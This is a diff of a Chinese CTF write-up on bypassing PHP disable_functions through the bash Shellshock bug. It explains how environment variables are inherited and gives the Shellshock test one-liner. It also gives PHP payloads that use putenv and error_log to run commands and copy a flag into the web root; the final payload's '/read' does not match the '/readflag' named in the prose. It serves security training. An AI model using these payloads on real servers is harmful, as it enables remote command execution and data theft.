@@ -420,8 +420,8 @@
 		
 		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
 			<a><i class="kirafont icon-calendar-fill"></i>2024年03月11日</a>
-			<a><i class="kirafont icon-edit-fill"></i>2.6k 字</a>
-			<a><i class="kirafont icon-time-circle-fill"></i>大概 11 分钟</a>
+			<a><i class="kirafont icon-edit-fill"></i>3.5k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 15 分钟</a>
 		</div>
 		<p><strong>这是ctfhub的Bypass disable_function知识体系</strong></p>
 <p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311235539559.png" alt="image-20240311235539559" class="lazyload"></p>
@@ -533,7 +533,66 @@
 
 <p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319000940380.png" alt="image-20240319000940380" class="lazyload"></p>
 <p><strong>环境变量和bash</strong></p>
+<p>在bash中，子进程是不能继承父进程的普通变量或函数变量的，但是可以继承父进程的普通环境变量和函数环境变量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# gu=&quot;hacker&quot;<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br>hacker<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure>
 
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084451562.png" alt="image-20240321084451562" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export gu<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084631286.png" alt="image-20240321084631286" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack() &#123; echo &quot;hacker&quot;; &#125;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084802497.png" alt="image-20240321084802497" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084851281.png" alt="image-20240321084851281" class="lazyload"></p>
+<p>下面就是有漏洞点的地方了，但是要在bash&lt;&#x3D;4.3版本才有该漏洞</p>
+<p>先来展示一下没有漏洞的情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test=&#x27;() &#123; echo &quot;this is a bug&quot;; &#125;&#x27;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321085418028.png" alt="image-20240321085418028" class="lazyload"></p>
+<p>有漏洞的情况就是在子进程中直接输入test会被当作函数来执行，比如文章中的这样</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;&#x27;<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10<br>bash: export: ailx10: not a function<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash<br>[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10<br>ailx10 is a hacker<br></code></pre></td></tr></table></figure>
+
+<p>还可以有这种方式，利用() { :; };&#x2F;bin&#x2F;ls</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123; :; &#125;;/bin/ls&#x27;<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash<br>curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt<br>curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit<br>exit<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$<br></code></pre></td></tr></table></figure>
+
+<p><strong>综上所述触发bash漏洞可以归纳如下</strong></p>
+<ol>
+<li>产生新的bash</li>
+<li>通过环境变量传递</li>
+<li>环境变量以<code>() &#123;&#125;</code>这样的形式</li>
+</ol>
+<p><strong>可以用下面的一条语句来验证是否有shellshock漏洞</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;<br></code></pre></td></tr></table></figure>
+
+<p>不存在的情况：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321090254063.png" alt="image-20240321090254063" class="lazyload"></p>
+<p>存在的情况：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321090319060.png" alt="image-20240321090319060" class="lazyload"></p>
+<blockquote>
+<p>:在这里就相当于true</p>
+<p><code>env</code>可以创建临时环境变量</p>
+<p><code>bash -c</code>可以运行一个shell命令</p>
+<p>对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行。</p>
+</blockquote>
+<p>那现在看回这题</p>
+<p>同样蚁剑连上之后执行不了命令</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321140952793.png" alt="image-20240321140952793" class="lazyload"></p>
+<p>这题说是利用到了shellshock漏洞，那就要满足上面三个条件，这里是利用了执行error_log函数时会执行sh -c -t -i，这里还需要sh 默认的 shell 是 bash，然后就会开启一个新的bash环境所以如果存在漏洞即可触发，我们可以自己写一个error_log然后去跟踪调用看一下 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321142333751.png" alt="image-20240321142333751" class="lazyload"></p>
+<p>那么就可以同样利用上一题的方法，用putenv来写一个php文件然后上传触发</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;hack=() &#123; :; &#125;;cat /flag &gt;&gt; /var/www/html/flag.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321142626262.png" alt="image-20240321142626262" class="lazyload"></p>
+<p>emmm很怪啊收不到flag</p>
+<p>难绷后来找到问题，环境变量一定要有PHP_前缀我也不知道为什么很奇怪，正确payload如下，这里flag不能直接读要用&#x2F;readflag：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_hack=() &#123; :; &#125;; /read &gt;&gt; /var/www/html/flag2.txt&quot;</span>); <br>   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321145724033.png" alt="image-20240321145724033" class="lazyload"></p>
+<h1><span id="apache-mod-cgi">Apache Mod CGI</span><a href="#apache-mod-cgi" class="header-anchor">#</a></h1>
 	</article>
 
 	 
